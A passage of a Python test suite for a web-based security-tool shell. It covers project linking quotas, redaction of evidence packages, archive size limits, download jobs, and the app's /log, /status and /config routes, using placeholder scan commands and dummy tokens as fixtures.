                    "SELECT entity_id FROM project_links "
                    "WHERE project_id = ? AND entity_type = 'atlas_entity'",
                    (project["id"],),
                ).fetchall()
            }
        assert run_link_count == 0
        assert removable_id not in remaining_entity_links
        assert curated_id in remaining_entity_links

        curated_project = self._create_project(client, session_id)
        curated_run_id = self._seed_run(session_id, "nmap curated.darklab.sh")
        curated_recorded = self._seed_run_entities(session_id, curated_run_id)
        curated_entity_id = curated_recorded[1]["id"]
        with db_connect() as conn:
            record_run_findings(conn, session_id, curated_run_id, [{
                "text": "443/tcp open https on darklab.sh",
                "signals": ["findings"],
                "line_index": 0,
                "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
            }])
            conn.commit()
        client.post(
            f"/projects/{curated_project['id']}/links",
            json={
                "entity_type": "run",
                "entity_id": curated_run_id,
                "source": "manual",
                "include_entities": True,
            },
            headers={"X-Session-ID": session_id},
        )
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO entity_labels (id, session_id, entity_type, entity_id, label, source, created) "
                "VALUES (?, ?, 'atlas_entity', ?, 'keep-curated', 'manual', datetime('now'))",
                ("lbl-" + uuid.uuid4().hex, session_id, curated_entity_id),
            )
            conn.commit()
        curated_unlink_resp = client.delete(
            f"/projects/{curated_project['id']}/links",
            json={
                "entity_type": "run",
                "entity_id": curated_run_id,
                "include_entities": True,
                "include_curated_entities": True,
            },
            headers={"X-Session-ID": session_id},
        )

        assert curated_unlink_resp.status_code == 200
        curated_unlink_data = json.loads(curated_unlink_resp.data)
        assert curated_unlink_data["unlinked_entities"]["removed"] == 2
        assert curated_unlink_data["unlinked_entities"]["removed_curated"] == 2
        assert curated_unlink_data["unlinked_entities"]["kept_curated"] == 0
        with db_connect() as conn:
            remaining_curated_links = conn.execute(
                "SELECT COUNT(*) AS count FROM project_links "
                "WHERE project_id = ? AND entity_type = 'atlas_entity'",
                (curated_project["id"],),
            ).fetchone()["count"]
        assert remaining_curated_links == 0

    def test_bulk_project_links_reject_too_many_entity_ids(self):
        client = get_client()
        session_id = self._session_id("project-bulk-too-many")
        project = self._create_project(client, session_id)
        resp = client.post(
            f"/projects/{project['id']}/links",
            json={
                "entity_type": "run",
                "entity_ids": [f"run-{index}" for index in range(101)],
            },
            headers={"X-Session-ID": session_id},
        )
        assert resp.status_code == 400
        assert json.loads(resp.data) == {"error": "too_many", "limit": 100}

    def test_bulk_project_links_report_policy_blocked_when_project_link_limit_is_reached(self):
        client = get_client()
        session_id = self._session_id("project-bulk-policy")
        with mock.patch.dict(shell_app.CFG, {"max_project_links_per_project": 2}, clear=False):
            project = self._create_project(client, session_id)
            first_run_id = self._seed_run(session_id, "nmap darklab.sh")
            second_run_id = self._seed_run(session_id, "dig darklab.sh")
            third_run_id = self._seed_run(session_id, "whois darklab.sh")

            legacy_resp = client.post(
                f"/projects/{project['id']}/links",
                json={"entity_type": "run", "entity_id": first_run_id},
                headers={"X-Session-ID": session_id},
            )
            assert legacy_resp.status_code == 201

            bulk_resp = client.post(
                f"/projects/{project['id']}/links",
                json={
                    "entity_type": "run",
                    "entity_ids": [second_run_id, third_run_id],
                },
                headers={"X-Session-ID": session_id},
            )

        assert bulk_resp.status_code == 200
        bulk_data = json.loads(bulk_resp.data)
        assert bulk_data["counts"] == {
            "added": 1,
            "already_linked": 0,
            "removed": 0,
            "not_linked": 0,
            "not_found": 0,
            "rejected": 1,
        }
        assert bulk_data["results"] == [
            {"run_id": second_run_id, "status": "added"},
            {"run_id": third_run_id, "status": "rejected", "reason": "policy_blocked"},
        ]

    def test_project_target_quota_ignores_bulk_linked_atlas_entities(self):
        client = get_client()
        session_id = self._session_id("project-target-quota")
        with mock.patch.dict(shell_app.CFG, {
            "max_project_links_per_project": 20,
            "max_project_entities_per_project": 20,
            "max_project_targets_per_project": 1,
        }, clear=False):
            project = self._create_project(client, session_id)
            run_id = self._seed_run(session_id, "katana -u https://darklab.sh")
            recorded = self._seed_run_entities(session_id, run_id)
            entity_ids = [item["id"] for item in recorded]

            bulk_link = client.post(
                f"/projects/{project['id']}/links",
                json={"entity_type": "atlas_entity", "entity_ids": entity_ids},
                headers={"X-Session-ID": session_id},
            )
            first_target = client.post(
                f"/projects/{project['id']}/targets",
                json={"type": "domain", "value": "example.com"},
                headers={"X-Session-ID": session_id},
            )
            second_target = client.post(
                f"/projects/{project['id']}/targets",
                json={"type": "domain", "value": "example.net"},
                headers={"X-Session-ID": session_id},
            )

        assert bulk_link.status_code == 200
        bulk_data = json.loads(bulk_link.data)
        assert bulk_data["counts"]["added"] == 2
        assert first_target.status_code == 201
        assert second_target.status_code == 409
        assert json.loads(second_target.data) == {"error": "project target quota exceeded for this project"}

    def test_bulk_project_atlas_links_obey_entity_quota(self):
        client = get_client()
        session_id = self._session_id("project-entity-quota")
        with mock.patch.dict(shell_app.CFG, {
            "max_project_links_per_project": 20,
            "max_project_entities_per_project": 1,
            "max_project_targets_per_project": 20,
        }, clear=False):
            project = self._create_project(client, session_id)
            run_id = self._seed_run(session_id, "katana -u https://darklab.sh")
            recorded = self._seed_run_entities(session_id, run_id)
            entity_ids = [item["id"] for item in recorded]

            bulk_link = client.post(
                f"/projects/{project['id']}/links",
                json={"entity_type": "atlas_entity", "entity_ids": entity_ids},
                headers={"X-Session-ID": session_id},
            )

        assert bulk_link.status_code == 200
        bulk_data = json.loads(bulk_link.data)
        assert bulk_data["counts"] == {
            "added": 1,
            "already_linked": 0,
            "removed": 0,
            "not_linked": 0,
            "not_found": 0,
            "rejected": 1,
        }
        assert [item["status"] for item in bulk_data["results"]] == ["added", "rejected"]
        assert bulk_data["results"][1]["reason"] == "policy_blocked"

    def test_redacted_evidence_package_redacts_manifest_and_transcripts(self, tmp_path):
        client = get_client()
        session_id = self._session_id("project-package-redacted")
        project = self._create_project(client, session_id)
        project_note = client.put(
            f"/projects/{project['id']}",
            json={"notes": "Project private note should stay out"},
            headers={"X-Session-ID": session_id},
        )
        assert project_note.status_code == 200
        run_id = "run-" + uuid.uuid4().hex
        workspace_cfg = {"workspace_enabled": True, "workspace_root": str(tmp_path / "workspaces")}
        artifact_body = b"Authorization: Bearer abc123 from https://secret.darklab.sh and 192.168.1.5\n"
        with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
            artifact_path = resolve_workspace_path(session_id, "reports/secrets.txt", shell_app.CFG, ensure_parent=True)
            artifact_path.write_bytes(artifact_body)
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, ?, datetime('now'), ?, ?)",
                (
                    run_id,
                    session_id,
                    "curl https://secret.darklab.sh -H 'Authorization: Bearer abc123'",
                    json.dumps([
                        {"text": "Authorization: Bearer abc123", "cls": "", "line_index": 0},
                        {
                            "text": "https://secret.darklab.sh responded from 192.168.1.5",
                            "cls": "",
                            "line_index": 1,
                        },
                    ]),
                    2,
                ),
            )
            conn.execute(
                "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                "VALUES (?, ?, 'run', ?, 'manual', datetime('now'))",
                ("pln_" + uuid.uuid4().hex[:16], project["id"], run_id),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', 'token leak', ?, 0, ?, datetime('now'))",
                (
                    f"fnd_{run_id}",
                    session_id,
                    run_id,
                    "Authorization: Bearer abc123 from secret.darklab.sh",
                    f"fp-{run_id}",
                ),
            )
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, "
                "content_type, preview_type, content_sha256, created) "
                "VALUES (?, ?, ?, 'reports/secrets.txt', 'secrets.txt', 'output', ?, "
                "'workspace_flag', 'text/plain', 'text', ?, datetime('now'))",
                (f"rfa_{run_id}", session_id, run_id, len(artifact_body), hashlib.sha256(artifact_body).hexdigest()),
            )
            for note_id, entity_type, entity_id, body in (
                (f"note_run_{run_id}", "run", run_id, "Run private note should stay out"),
                (f"note_fnd_{run_id}", "finding", f"fnd_{run_id}", "Finding private note should stay out"),
                (f"note_art_{run_id}", "run_file_artifact", f"rfa_{run_id}", "Artifact private note should stay out"),
            ):
                conn.execute(
                    "INSERT INTO entity_notes "
                    "(id, session_id, entity_type, entity_id, body, created, updated) "
                    "VALUES (?, ?, ?, ?, ?, datetime('now'), datetime('now'))",
                    (note_id, session_id, entity_type, entity_id, body),
                )
            conn.commit()

        target_resp = client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "domain", "value": "secret.darklab.sh", "source_run_id": run_id},
            headers={"X-Session-ID": session_id},
        )
        assert target_resp.status_code == 201
        target_id = json.loads(target_resp.data)["target"]["id"]
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'target', ?, 'Target private note should stay out', datetime('now'), datetime('now'))",
                (f"note_tgt_{run_id}", session_id, target_id),
            )
            conn.commit()

        with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
            package_resp = client.post(
                f"/projects/{project['id']}/packages",
                json={
                    "name": "Redacted Evidence",
                    "notes": "Package private note should stay out",
                    "redaction_mode": "redacted",
                    "include_artifacts": True,
                    "selection": {
                        "run_ids": [run_id],
                        "finding_ids": [f"fnd_{run_id}"],
                        "artifact_ids": [f"rfa_{run_id}"],
                        "target_ids": [target_id],
                    },
                },
                headers={"X-Session-ID": session_id},
            )
        assert package_resp.status_code == 201
        package = json.loads(package_resp.data)["package"]
        assert package["redaction_mode"] == "redacted"
        assert package["include_artifacts"] is True
        assert package["manifest"]["redaction_mode"] == "redacted"
        assert package["manifest"]["include_artifacts"] is True
        assert package["manifest"]["options"]["raw_artifacts"] is False
        assert package["manifest"]["options"]["redacted_artifact_derivatives"] is True
        assert package["manifest"]["artifact_warnings"] == []
        assert package["manifest"]["estimated_archive"]["redacted_artifact_count_estimate"] == 1
        assert "note" not in package["manifest"]["project"]
        assert "Project private note" not in json.dumps(package["manifest"])
        assert "Bearer abc123" not in json.dumps(package)
        assert "secret.darklab.sh" not in json.dumps(package)
        assert "192.168.1.5" not in json.dumps(package)

        with mock.patch.dict(shell_app.CFG, workspace_cfg, clear=False):
            package_download = client.get(
                f"/projects/{project['id']}/packages/{package['id']}/download",
                headers={"X-Session-ID": session_id},
            )
        assert package_download.status_code == 200
        with zipfile.ZipFile(io.BytesIO(package_download.data)) as archive:
            names = set(archive.namelist())
            assert "manifest.json" in names
            assert "assets/package.css" in names
            assert "index.html" in names
            assert "README.md" in names
            assert "findings/findings.json" in names
            assert "findings/findings.md" in names
            assert "targets/targets.json" in names
            assert "targets/targets.md" in names
            assert "metadata/labels.json" in names
            assert "notes/entity-notes.json" in names
            assert "notes/entity-notes.md" in names
            assert "notes/project.md" not in names
            assert f"runs/{run_id}.html" in names
            assert not any(name.startswith("artifacts/") for name in names)
            redacted_artifact_path = next(name for name in names if name.startswith("artifacts-redacted/"))
            assert "secrets.txt" not in redacted_artifact_path
            assert "redacted-artifacts.json" in names
            notes_json = json.loads(archive.read("notes/entity-notes.json"))
            assert notes_json["include_private_notes"] is False
            assert notes_json["count"] == 0
            package_text = "\n".join(
                archive.read(name).decode("utf-8")
                for name in (
                    "manifest.json",
                    "index.html",
                    "README.md",
                    "findings/findings.json",
                    "findings/findings.md",
                    "targets/targets.json",
                    "targets/targets.md",
                    "metadata/labels.json",
                    "notes/entity-notes.json",
                    "notes/entity-notes.md",
                    redacted_artifact_path,
                    f"runs/{run_id}.html",
                )
            )
            redacted_artifacts = json.loads(archive.read("redacted-artifacts.json"))
            assert redacted_artifacts["artifacts"][0]["archive_path"] == redacted_artifact_path
        assert "Bearer abc123" not in package_text
        assert "secret.darklab.sh" not in package_text
        assert "192.168.1.5" not in package_text
        assert "Bearer [redacted]" in package_text
        assert "[host-redacted]" in package_text
        assert "[ip-redacted]" in package_text
        assert "Project private note" not in package_text
        assert "Package private note" not in package_text
        assert "Run private note" not in package_text
        assert "Finding private note" not in package_text
        assert "Target private note" not in package_text
        assert "Artifact private note" not in package_text
        assert "notes/project.md" not in package_text

    def test_project_workspace_write_quotas_return_conflict(self):
        client = get_client()
        session_id = self._session_id("project-quota")
        with mock.patch.dict(shell_app.CFG, {
            "max_projects_per_session": 5,
            "max_project_links_per_project": 1,
            "max_project_targets_per_project": 1,
            "max_evidence_packages_per_project": 1,
            "max_entity_labels_per_session": 5,
            "max_entity_labels_per_entity": 1,
            "max_entity_notes_per_session": 5,
        }, clear=False):
            project = self._create_project(client, session_id)
            first_run_id = "run-" + uuid.uuid4().hex
            second_run_id = "run-" + uuid.uuid4().hex
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, 'dig darklab.sh', datetime('now'))",
                    (first_run_id, session_id),
                )
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, 'whois darklab.sh', datetime('now'))",
                    (second_run_id, session_id),
                )
                conn.commit()

            first_link = client.post(
                f"/projects/{project['id']}/links",
                json={"entity_type": "run", "entity_id": first_run_id},
                headers={"X-Session-ID": session_id},
            )
            duplicate_link = client.post(
                f"/projects/{project['id']}/links",
                json={"entity_type": "run", "entity_id": first_run_id},
                headers={"X-Session-ID": session_id},
            )
            second_link = client.post(
                f"/projects/{project['id']}/links",
                json={"entity_type": "run", "entity_id": second_run_id},
                headers={"X-Session-ID": session_id},
            )
            assert first_link.status_code == 201
            assert duplicate_link.status_code == 201
            assert second_link.status_code == 409

            first_target = client.post(
                f"/projects/{project['id']}/targets",
                json={"type": "domain", "value": "darklab.sh"},
                headers={"X-Session-ID": session_id},
            )
            second_target = client.post(
                f"/projects/{project['id']}/targets",
                json={"type": "domain", "value": "example.com"},
                headers={"X-Session-ID": session_id},
            )
            assert first_target.status_code == 201
            assert second_target.status_code == 409

            first_package = client.post(
                f"/projects/{project['id']}/packages",
                json={"name": "First package"},
                headers={"X-Session-ID": session_id},
            )
            second_package = client.post(
                f"/projects/{project['id']}/packages",
                json={"name": "Second package"},
                headers={"X-Session-ID": session_id},
            )
            assert first_package.status_code == 201
            assert second_package.status_code == 409

            first_label = client.post(
                f"/entities/run/{first_run_id}/labels",
                json={"label": "baseline"},
                headers={"X-Session-ID": session_id},
            )
            duplicate_label = client.post(
                f"/entities/run/{first_run_id}/labels",
                json={"label": "baseline"},
                headers={"X-Session-ID": session_id},
            )
            second_label = client.post(
                f"/entities/run/{first_run_id}/labels",
                json={"label": "important"},
                headers={"X-Session-ID": session_id},
            )
            assert first_label.status_code == 201
            assert duplicate_label.status_code == 201
            assert second_label.status_code == 409

            first_note = client.put(
                f"/entities/run/{first_run_id}/note",
                json={"body": "first note"},
                headers={"X-Session-ID": session_id},
            )
            second_note = client.put(
                f"/entities/run/{first_run_id}/note",
                json={"body": "second note"},
                headers={"X-Session-ID": session_id},
            )
            assert first_note.status_code == 200
            assert second_note.status_code == 200
            assert json.loads(second_note.data)["note"]["body"] == "second note"

    def test_evidence_package_download_enforces_size_limit(self, tmp_path):
        client = get_client()
        session_id = self._session_id("project-package-size")
        project = self._create_project(client, session_id)
        run_id = "run-" + uuid.uuid4().hex
        with mock.patch.dict(shell_app.CFG, {
            "workspace_enabled": True,
            "workspace_root": str(tmp_path / "workspaces"),
            "evidence_package_max_mb": 1,
            "evidence_package_max_uncompressed_mb": 5,
        }, clear=False):
            artifact_path = resolve_workspace_path(session_id, "reports/big.txt", shell_app.CFG, ensure_parent=True)
            artifact_path.write_bytes(os.urandom(1024 * 1024 + 1))
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, 'cat reports/big.txt', datetime('now'))",
                    (run_id, session_id),
                )
                conn.execute(
                    "INSERT INTO project_links (id, project_id, entity_type, entity_id, source, created) "
                    "VALUES (?, ?, 'run', ?, 'manual', datetime('now'))",
                    ("pln_" + uuid.uuid4().hex[:16], project["id"], run_id),
                )
                conn.execute(
                    "INSERT INTO run_file_artifacts "
                    "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                    "VALUES (?, ?, ?, 'reports/big.txt', 'big.txt', 'output', ?, 'workspace_flag', datetime('now'))",
                    ("rfa_" + uuid.uuid4().hex[:16], session_id, run_id, artifact_path.stat().st_size),
                )
                conn.commit()
            package = json.loads(client.post(
                f"/projects/{project['id']}/packages",
                json={"name": "Oversize", "include_artifacts": True},
                headers={"X-Session-ID": session_id},
            ).data)["package"]
            resp = client.get(
                f"/projects/{project['id']}/packages/{package['id']}/download",
                headers={"X-Session-ID": session_id},
            )
        assert resp.status_code == 413
        assert "ZIP exceeds configured size limit" in json.loads(resp.data)["error"]

    def test_evidence_package_download_job_builds_and_downloads_archive(self):
        client = get_client()
        session_id = self._session_id("project-package-job")
        project = self._create_project(client, session_id)
        run_id = self._seed_run(session_id, "nuclei -u https://darklab.sh")
        self._link_run(client, session_id, project["id"], run_id)
        package = json.loads(client.post(
            f"/projects/{project['id']}/packages",
            json={
                "name": "Async Evidence",
                "selection": {
                    "run_ids": [run_id],
                    "transcript_run_ids": [run_id],
                    "finding_ids": [],
                    "artifact_ids": [],
                    "target_ids": [],
                },
            },
            headers={"X-Session-ID": session_id},
        ).data)["package"]

        job_resp = client.post(
            f"/projects/{project['id']}/packages/{package['id']}/download-jobs",
            headers={"X-Session-ID": session_id},
        )
        assert job_resp.status_code == 202
        job = json.loads(job_resp.data)["job"]
        assert job["status"] in {"queued", "running", "complete"}
        deadline = time.time() + 5
        while job["status"] not in {"complete", "failed"} and time.time() < deadline:
            time.sleep(0.02)
            status_resp = client.get(
                f"/projects/{project['id']}/packages/{package['id']}/download-jobs/{job['id']}",
                headers={"X-Session-ID": session_id},
            )
            assert status_resp.status_code == 200
            job = json.loads(status_resp.data)["job"]
        assert job["status"] == "complete"
        assert job["archive_bytes"] > 0

        download_resp = client.get(
            f"/projects/{project['id']}/packages/{package['id']}/download-jobs/{job['id']}/download",
            headers={"X-Session-ID": session_id},
        )
        assert download_resp.status_code == 200
        assert "attachment" in download_resp.headers["Content-Disposition"]
        with zipfile.ZipFile(io.BytesIO(download_resp.data)) as archive:
            assert "manifest.json" in archive.namelist()
            assert f"runs/{run_id}.html" in archive.namelist()
        download_resp.close()

    def test_project_artifacts_are_explicitly_disabled_when_files_are_disabled(self):
        client = get_client()
        session_id = self._session_id("project-files-off")
        project = self._create_project(client, session_id)
        run_id = self._seed_run(session_id, "nuclei -u https://darklab.sh")
        self._link_run(client, session_id, project["id"], run_id)
        artifact_id = "rfa_" + uuid.uuid4().hex[:16]
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                "VALUES (?, ?, ?, 'reports/nuclei.json', 'nuclei.json', 'output', 42, "
                "'workspace_flag', datetime('now'))",
                (artifact_id, session_id, run_id),
            )
            conn.commit()

        with mock.patch.dict(shell_app.CFG, {"workspace_enabled": False}, clear=False):
            summary_resp = client.get(
                f"/projects/{project['id']}/summary",
                headers={"X-Session-ID": session_id},
            )
            artifacts_resp = client.get(
                f"/projects/{project['id']}/artifacts?limit=10&offset=0",
                headers={"X-Session-ID": session_id},
            )
            assert summary_resp.status_code == 200
            assert json.loads(summary_resp.data)["artifacts"] == []
            assert artifacts_resp.status_code == 200
            artifact = json.loads(artifacts_resp.data)["artifacts"][0]
            assert artifact["file_status"] == "disabled"
            assert artifact["file_available"] is False
            assert artifact["file_status_detail"] == "Files are disabled on this instance"

            preview_resp = client.get(
                f"/projects/{project['id']}/artifacts/{artifact_id}/preview",
                headers={"X-Session-ID": session_id},
            )
            download_resp = client.get(
                f"/projects/{project['id']}/artifacts/{artifact_id}/download",
                headers={"X-Session-ID": session_id},
            )
            package_resp = client.post(
                f"/projects/{project['id']}/packages",
                json={
                    "name": "Transcript Only",
                    "include_artifacts": True,
                    "selection": {"run_ids": [run_id], "artifact_ids": [artifact_id]},
                },
                headers={"X-Session-ID": session_id},
            )

        assert preview_resp.status_code == 403
        assert json.loads(preview_resp.data)["error"] == "Files are disabled on this instance"
        assert download_resp.status_code == 403
        assert json.loads(download_resp.data)["error"] == "Files are disabled on this instance"
        assert package_resp.status_code == 201
        package = json.loads(package_resp.data)["package"]
        assert package["include_artifacts"] is False
        assert package["manifest"]["include_artifacts"] is False
        assert package["manifest"]["options"]["raw_artifacts"] is False
        assert package["manifest"]["artifacts"][0]["file_status"] == "disabled"

    def test_rejects_cross_session_or_unsupported_project_links(self):
        client = get_client()
        session_id = self._session_id("project-link")
        other_session = self._session_id("project-other")
        project = self._create_project(client, session_id)
        other_run_id = "run-" + uuid.uuid4().hex
        builtin_run_id = "run-" + uuid.uuid4().hex

        def project_link_post(payload):
            return client.post(
                f"/projects/{project['id']}/links",
                json=payload,
                headers={"X-Session-ID": session_id},
            )

        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, ?, datetime('now'))",
                (other_run_id, other_session, "dig darklab.sh"),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, run_kind, command, started) "
                "VALUES (?, ?, 'builtin', ?, datetime('now'))",
                (builtin_run_id, session_id, "project list"),
            )
            conn.execute(
                "INSERT INTO snapshots (id, session_id, label, created, content) VALUES (?, ?, ?, datetime('now'), ?)",
                (f"{session_id}-snapshot", session_id, "snapshot", "[]"),
            )
            conn.commit()

        cross_session = project_link_post({"entity_type": "run", "entity_id": other_run_id})
        builtin_link = project_link_post({"entity_type": "run", "entity_id": builtin_run_id})
        unsupported = project_link_post({"entity_type": "note", "entity_id": "note_1"})
        run_scoped = project_link_post({"entity_type": "run_file_artifact", "entity_id": "rfa_1"})
        snapshot_link = project_link_post({"entity_type": "snapshot", "entity_id": f"{session_id}-snapshot"})
        workspace_file_link = project_link_post({"entity_type": "workspace_file", "entity_id": "reports/notes.txt"})

        assert cross_session.status_code == 404
        assert "not found" in json.loads(cross_session.data)["error"]
        assert builtin_link.status_code == 400
        assert "external runs" in json.loads(builtin_link.data)["error"]
        assert unsupported.status_code == 400
        assert "Unsupported project entity type" in json.loads(unsupported.data)["error"]
        assert run_scoped.status_code == 400
        assert "do not support" in json.loads(run_scoped.data)["error"]
        assert snapshot_link.status_code == 400
        assert "do not support" in json.loads(snapshot_link.data)["error"]
        assert workspace_file_link.status_code == 400
        assert "do not support" in json.loads(workspace_file_link.data)["error"]


# ── /log ──────────────────────────────────────────────────────────────────────

class TestClientLogRoute:
    def test_accepts_client_error_payload(self):
        client = get_client()
        with mock.patch.object(shell_assets.log, "warning") as mock_warning:
            resp = client.post("/log", json={
                "context": "session-token set",
                "message": "ReferenceError: global is not defined",
            })
        assert resp.status_code == 200
        assert resp.get_json() == {"ok": True}
        mock_warning.assert_called_once()
        assert mock_warning.call_args[0][0] == "CLIENT_ERROR"
        extra = mock_warning.call_args.kwargs["extra"]
        assert extra["context"] == "session-token set"
        assert extra["client_message"] == "ReferenceError: global is not defined"


# ── /status ───────────────────────────────────────────────────────────────────

class TestStatusRoute:
    def test_returns_200_even_when_db_fails(self):
        # /status is for live HUD polling; it must never return 503 so a
        # blip doesn't tear down the UI. Fields report state instead.
        client = get_client()
        with mock.patch("blueprints.assets.db_connect", side_effect=Exception("db error")):
            resp = client.get("/status")
        assert resp.status_code == 200

    def test_response_contains_expected_keys(self):
        client = get_client()
        data = json.loads(client.get("/status").data)
        for key in ("uptime", "db", "redis", "server_time"):
            assert key in data

    def test_uptime_is_non_negative_integer(self):
        client = get_client()
        data = json.loads(client.get("/status").data)
        assert isinstance(data["uptime"], int)
        assert data["uptime"] >= 0

    def test_db_ok_when_sqlite_available(self):
        client = get_client()
        data = json.loads(client.get("/status").data)
        assert data["db"] == "ok"

    def test_db_down_when_sqlite_fails(self):
        client = get_client()
        with mock.patch("blueprints.assets.db_connect", side_effect=Exception("db error")):
            data = json.loads(client.get("/status").data)
        assert data["db"] == "down"

    def test_redis_none_when_not_configured(self):
        # In the test environment there is no Redis configured.
        client = get_client()
        data = json.loads(client.get("/status").data)
        assert data["redis"] == "none"

    def test_redis_ok_when_ping_succeeds(self):
        client = get_client()
        fake_redis = mock.MagicMock()
        fake_redis.ping.return_value = True
        with mock.patch("blueprints.assets.redis_client", fake_redis):
            data = json.loads(client.get("/status").data)
        assert data["redis"] == "ok"

    def test_redis_down_when_ping_fails(self):
        client = get_client()
        fake_redis = mock.MagicMock()
        fake_redis.ping.side_effect = Exception("redis down")
        with mock.patch("blueprints.assets.redis_client", fake_redis):
            data = json.loads(client.get("/status").data)
        assert data["redis"] == "down"

    def test_server_time_is_ms_epoch(self):
        client = get_client()
        data = json.loads(client.get("/status").data)
        assert isinstance(data["server_time"], int)
        # Any plausible ms-epoch timestamp in 2026 fits in 13 digits.
        assert 1e12 < data["server_time"] < 1e13


# ── /config ───────────────────────────────────────────────────────────────────

class TestConfigRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/config")
        assert resp.status_code == 200

    def test_contains_expected_keys(self):
        client = get_client()
        data = json.loads(client.get("/config").data)
        for key in (
            "app_name", "project_readme", "prompt_username", "prompt_domain", "default_theme",
            "max_tabs", "max_output_lines", "high_volume_output_line_threshold",
            "high_volume_output_status_interval_lines", "evidence_package_max_mb",
            "evidence_package_max_uncompressed_mb", "evidence_package_max_artifacts",
            "workspace_enabled", "interactive_pty_commands",
            "scheduler_default_timezone",
            "tour_chapters",
        ):
            assert key in data
        assert "share_redaction_enabled" in data
        assert "share_redaction_rules" in data

    def test_interactive_pty_commands_reflect_registry(self):
        client = get_client()
        registry = {
            "commands": [{
                "root": "watcher",
                "interactive": {
                    "mode": "pty",
                    "trigger_flag": "--live",
                    "default_rows": 35,
                    "default_cols": 120,
                    "max_runtime_seconds": 180,
                    "allow_input": False,
                    "requires_args": False,
                },
            }],
            "pipe_helpers": [],
        }
        with mock.patch("services.commands.registry.load_commands_registry", return_value=registry):
            data = json.loads(client.get("/config").data)

        assert data["interactive_pty_commands"] == [{
            "root": "watcher",
            "trigger_flag": "--live",
            "default_rows": 35,
            "default_cols": 120,
            "max_runtime_seconds": 180,
            "allow_input": False,
            "requires_args": False,
            "transcript_mode": "final_frame",
            "input_safety": "no_input",
        }]

    def test_workspace_menu_affordances_follow_config(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"workspace_enabled": False}):
            disabled_body = client.get("/").get_data(as_text=True)
        with mock.patch.dict("config.CFG", {"workspace_enabled": True}):
            enabled_body = client.get("/").get_data(as_text=True)

        assert 'data-action="workspace"' not in disabled_body
        assert 'data-menu-action="workspace"' not in disabled_body
        assert 'data-action="workspace"' in enabled_body
        assert 'data-menu-action="workspace"' in enabled_body

    def test_max_tabs_is_int(self):
        client = get_client()
        data = json.loads(client.get("/config").data)
        assert isinstance(data["max_tabs"], int)

    def test_contains_timeout_and_welcome_keys(self):
        client = get_client()
        data = json.loads(client.get("/config").data)
        for key in ("command_timeout_seconds",
                    "welcome_char_ms", "welcome_jitter_ms",
                    "welcome_post_cmd_ms", "welcome_inter_block_ms",
                    "welcome_first_prompt_idle_ms", "welcome_post_status_pause_ms",
                    "welcome_sample_count", "welcome_status_labels",
                    "welcome_hint_interval_ms", "welcome_hint_rotations",
                    "tour_enabled", "tour_version", "tour_chapter_count"):
            assert key in data, f"missing key: {key}"

    def test_all_new_keys_are_ints(self):
        client = get_client()
        data = json.loads(client.get("/config").data)
        for key in ("command_timeout_seconds",
                    "welcome_char_ms", "welcome_jitter_ms",
                    "welcome_post_cmd_ms", "welcome_inter_block_ms",
                    "welcome_first_prompt_idle_ms", "welcome_post_status_pause_ms",
                    "welcome_sample_count", "welcome_hint_interval_ms",
                    "welcome_hint_rotations", "tour_version", "tour_chapter_count"):
            assert isinstance(data[key], int), f"{key} should be int, got {type(data[key])}"
        assert isinstance(data["tour_enabled"], bool)
        assert isinstance(data["welcome_status_labels"], list)
        assert all(isinstance(item, str) for item in data["welcome_status_labels"])

    def test_command_timeout_reflects_cfg(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"command_timeout_seconds": 300}):
            data = json.loads(client.get("/config").data)
        assert data["command_timeout_seconds"] == 300

    def test_prompt_identity_reflects_cfg(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"prompt_username": "ops", "prompt_domain": "darklab"}):
            data = json.loads(client.get("/config").data)
        assert data["prompt_username"] == "ops"
        assert data["prompt_domain"] == "darklab"

    def test_project_readme_is_constant(self):
        client = get_client()
        with mock.patch("config.PROJECT_README", "https://example.invalid/README.md"):
            data = json.loads(client.get("/config").data)
        assert data["project_readme"] == "https://example.invalid/README.md"

    def test_welcome_timing_reflects_cfg(self):
        client = get_client()
        overrides = {
            "welcome_char_ms": 25,
            "welcome_jitter_ms": 5,
            "welcome_post_cmd_ms": 400,
            "welcome_inter_block_ms": 1000,
            "welcome_first_prompt_idle_ms": 1800,
            "welcome_post_status_pause_ms": 300,
            "welcome_sample_count": 4,
            "welcome_status_labels": ["CONFIG", "CACHE", "READY"],
            "welcome_hint_interval_ms": 3000,
            "welcome_hint_rotations": 1,
        }
        with mock.patch.dict("config.CFG", overrides):
            data = json.loads(client.get("/config").data)
        for key, val in overrides.items():
            assert data[key] == val, f"{key}: expected {val}, got {data[key]}"

    def test_tour_metadata_reflects_cfg_and_visible_chapters(self):
        client = get_client()
        tour_payload = {
            "version": 7,
            "chapters": [{"id": "one"}, {"id": "two"}],
        }
        with mock.patch.dict("config.CFG", {"tour_enabled": True}):
